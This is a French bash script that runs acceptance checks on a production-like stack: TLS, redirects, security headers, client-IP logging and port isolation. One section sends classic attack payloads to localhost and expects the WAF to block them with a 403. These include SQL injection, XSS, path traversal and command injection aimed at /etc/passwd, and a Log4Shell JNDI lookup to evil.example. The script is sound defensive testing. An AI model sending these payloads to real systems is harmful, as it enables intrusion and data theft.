#!/usr/bin/env bash
# Recette de la chaîne test-prod (./start.sh --test-prod) : TLS, redirection, WAF, en-têtes, isolement de l'API.
#   docker/test-prod/check.sh
set -uo pipefail
cd "$(dirname "$0")/../.."
set -a; source .env; set +a

CA=secrets/test-prod/ca.crt
PORT="${TESTPROD_HTTPS_PORT:-443}"
U="https://localhost:$PORT"
[[ "$PORT" == 443 ]] && U="https://localhost"
dc() { docker compose -f docker-compose.prod.yml -f docker-compose.test-prod.yml "$@"; }

pass=0 fail=0
ok() { pass=$((pass + 1)); echo "  ✔ $*"; }
ko() { fail=$((fail + 1)); echo "  ✘ $*"; }
code() { curl -s -o /dev/null -w '%{http_code}' --cacert "$CA" "$@"; }
expect() { # expect <code attendu> <description> <args curl…>
  local want=$1 desc=$2; shift 2
  local got; got="$(code "$@")"
  [[ "$got" == "$want" ]] && ok "$desc → $got" || ko "$desc → $got (attendu $want)"
}

echo "== TLS public (HAProxy) =="
out="$(echo | openssl s_client -connect "localhost:$PORT" -servername localhost -CAfile "$CA" 2>/dev/null)"
grep -q 'New, TLSv1.3' <<<"$out" && ok "TLS 1.3 négocié" || ko "TLS 1.3 non négocié"
grep -q 'Verify return code: 0' <<<"$out" && ok "certificat vérifié par la CA de test" || ko "certificat non vérifié"
# Sortie capturée d'abord : avec pipefail, le code d'erreur d'openssl ferait échouer le pipeline.
tls12="$(echo | openssl s_client -connect "localhost:$PORT" -tls1_2 2>&1)"
grep -q 'alert protocol version' <<<"$tls12" && ok "TLS 1.2 refusé" || ko "TLS 1.2 accepté"

echo "== Redirection HTTP =="
r="$(curl -s -o /dev/null -w '%{http_code} %{redirect_url}' "http://localhost:${TESTPROD_HTTP_PORT:-80}/api/v1/x")"
[[ "$r" == "301 https://localhost/api/v1/x" ]] && ok "HTTP → 301 HTTPS" || ko "redirection : $r"

echo "== Trafic légitime → API (refus par défaut : 401) =="
headers="$(curl -s -D - -o /dev/null --cacert "$CA" "$U/api/v1/courses" | tr -d '\r')"
grep -q '^HTTP/2 401' <<<"$headers" && ok "401 de l'API à travers HAProxy et le WAF" || ko "réponse : $(head -1 <<<"$headers")"
grep -qi '^content-type: application/problem+json' <<<"$headers" && ok "ProblemDetail" || ko "pas de ProblemDetail"
grep -qi '^strict-transport-security: .*preload' <<<"$headers" && ok "HSTS preload" || ko "HSTS absent"
grep -qi "^content-security-policy: default-src 'none'" <<<"$headers" && ok "CSP stricte" || ko "CSP absente"
grep -qi '^server:' <<<"$headers" && ko "en-tête Server présent" || ok "aucun en-tête Server"

echo "== IP cliente (limitation des logins) =="
# PRE-01 (feature 001, RG-05) : l'IP vue par l'API doit être celle du client, jamais celle d'un relais.
login_probe() { # login_probe [args curl…] → code HTTP d'un login échoué
  code -X POST -H 'Content-Type: application/json' \
    --data-binary '{"username":"chk-ip-probe","password":"Chk-Wrong-Passw0rd"}' "$@" "$U/api/v1/auth/login"
}
last_failure_ip() { # valeur ip= de la dernière ligne event=LOGIN_FAILURE de l'API
  dc logs --no-log-prefix api-prod 2>/dev/null | grep 'event=LOGIN_FAILURE' | tail -1 \
    | sed -n 's/.*[[:space:]]ip=\([^[:space:]"]*\).*/\1/p'
}
got="$(login_probe)"
[[ "$got" == 401 ]] && ok "CHK-01 login sonde → 401" || ko "CHK-01 login sonde → $got (attendu 401)"
sleep 1
ip="$(last_failure_ip)"
if [[ -n "$ip" && "$ip" != "-" && "$ip" != 172.31.0.10 && "$ip" != 172.31.0.11 ]]; then
  ok "CHK-01 IP cliente journalisée ($ip) ≠ IP d'un relais"
else
  ko "IP cliente = IP d'un relais : RG-05 deviendrait global (ip='${ip}')"
fi
got="$(login_probe -H 'X-Forwarded-For: 198.51.100.66')"
[[ "$got" == 401 ]] && ok "CHK-02 login sonde avec X-Forwarded-For client → 401" || ko "CHK-02 login sonde → $got (attendu 401)"
sleep 1
ip="$(last_failure_ip)"
[[ "$ip" != 198.51.100.66 ]] && ok "CHK-02 X-Forwarded-For du client ignoré (ip=$ip)" \
  || ko "CHK-02 X-Forwarded-For du client pris en compte : IP usurpable"

echo "== Attaques → bloquées par le WAF (403) =="
expect 403 "SQLi en paramètre"            "$U/api/v1/courses?id=1%27%20OR%20%271%27%3D%271"
expect 403 "XSS en paramètre"             "$U/api/v1/courses?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
expect 403 "Path traversal"               "$U/api/v1/files?path=../../../../etc/passwd"
expect 403 "Injection de commande"        "$U/api/v1/x?cmd=%3Bcat%20%2Fetc%2Fpasswd"
expect 403 "SQLi dans un corps JSON"      -X POST -H 'Content-Type: application/json' \
  --data-binary '{"name":"x'"'"' UNION SELECT password FROM users--"}' "$U/api/v1/courses"
expect 403 'Log4Shell (${jndi:…})'        -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' "$U/api/v1/courses"
expect 403 "Scanner (User-Agent sqlmap)"  -A 'sqlmap/1.8#stable' "$U/api/v1/courses"

echo "== Filtrage HAProxy =="
expect 421 "Host inconnu"                 -H 'Host: evil.example' "$U/api/v1/x"

echo "== Isolement =="
curl -sk -o /dev/null --max-time 3 https://127.0.0.1:8443/ 2>/dev/null && ko "API joignable en direct sur l'hôte" \
  || ok "API non joignable en direct (8443 non publié)"
published() { # published <service> : liaisons de ports réelles du conteneur (docker compose port n'est pas fiable)
  docker inspect "$(dc ps -q "$1")" --format '{{range $p, $b := .NetworkSettings.Ports}}{{if $b}}{{$p}} {{end}}{{end}}'
}
[[ -z "$(published api-prod)" ]] && ok "api-prod sans port publié" || ko "api-prod publiée : $(published api-prod)"
[[ -z "$(published db)" ]] && ok "PostgreSQL sans port publié" || ko "PostgreSQL publiée : $(published db)"
[[ "$(published haproxy)" == *8443/tcp* ]] && ok "seul HAProxy est publié (entrée unique)" || ko "HAProxy non publié"

echo "== Journal du WAF =="
blocked="$(dc logs waf 2>/dev/null | grep -c '"transaction"')"
((blocked > 0)) && ok "$blocked transaction(s) auditée(s) par ModSecurity" || ko "aucun audit ModSecurity"

echo
echo "Résultat : $pass OK, $fail KO"
((fail == 0))
